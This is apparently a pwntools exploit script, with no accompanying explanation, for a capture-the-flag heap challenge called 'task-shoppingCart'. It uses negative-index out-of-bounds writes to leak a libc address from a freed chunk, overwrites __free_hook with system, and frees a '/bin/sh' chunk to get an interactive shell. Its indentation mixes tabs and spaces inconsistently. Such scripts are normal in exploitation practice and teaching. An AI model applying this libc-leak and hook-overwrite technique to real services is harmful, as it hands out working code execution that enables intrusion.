from pwn import *
import time
context.log_level = 'debug'

p = process("./task-shoppingCart")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def Break():
	p.recvuntil("EMMmmm, you will be a rich man!")
	p.sendline("3")

def Modify(index,payload):
	p.recvuntil("Now, buy buy buy!")
	p.sendline("3")
	p.recvuntil("Which goods you need to modify?")
	p.sendline(str(index))
	p.recvuntil("to?")
	p.send(payload)

def Free(index):
	p.recvuntil("Now, buy buy buy!")
	p.sendline("2")
	p.recvuntil("Which goods that you don't need?")
	p.sendline(str(index))
	p.recvuntil("You really don't need it?")


def Buy(length,name):
	p.recvuntil("Now, buy buy buy!")
	p.sendline("1")
	p.recvuntil("How long is your goods name?")
	p.sendline(str(length))
	p.recvuntil("What is your goods name?")
	p.sendline(name)

def Shop(payload):
	p.recvuntil("EMMmmm, you will be a rich man!")
	p.sendline("1")
	p.recvuntil("RMB or Dollar?")
	p.sendline(payload)

if __name__=="__main__":
	for i in range(0,0x14):
		payload = "AAAAAAA"
		Shop(payload)
#leak the address
	
	Break()
	Buy(0x100,"BBBBBB")
	Buy(0x70,"/bin/sh\0")

#	gdb.attach(p)

	Free(0)

	Buy(0,"")
	
	p.recvuntil("Now, buy buy buy!")
        p.sendline("3")
        p.recvuntil("Which goods you need to modify?")
        p.sendline(str(2))
        p.recvuntil("modify ")
        leak_base = u64(p.recv(6).ljust(8,'\0')) - 344 - libc.symbols['__malloc_hook'] -0x10

	p.send("beef")
	print hex(leak_base)

	system_addr = leak_base + libc.symbols['system']
	 
	Modify(-1,"d"*8)

#	gdb.attach(p)	

	p.recvuntil("Now, buy buy buy!")
        p.sendline("3")
        p.recvuntil("Which goods you need to modify?")
	payload = str(-0x14) + '\n' + str(1)+'\n'+str(2)+'\n'
	payload = payload.ljust(0x1000-0x20,'c')

	payload += p64(leak_base+libc.symbols['__free_hook'])
        p.send(payload)

        p.recvuntil("to?")

	p.send(p64(leak_base+libc.symbols['system']))
#	Modify(-0x14,"")
	#raw_input()	
#	time.sleep(2)
	Buy(0x200,"ddddd")
	
	Free(1)

	p.interactive()




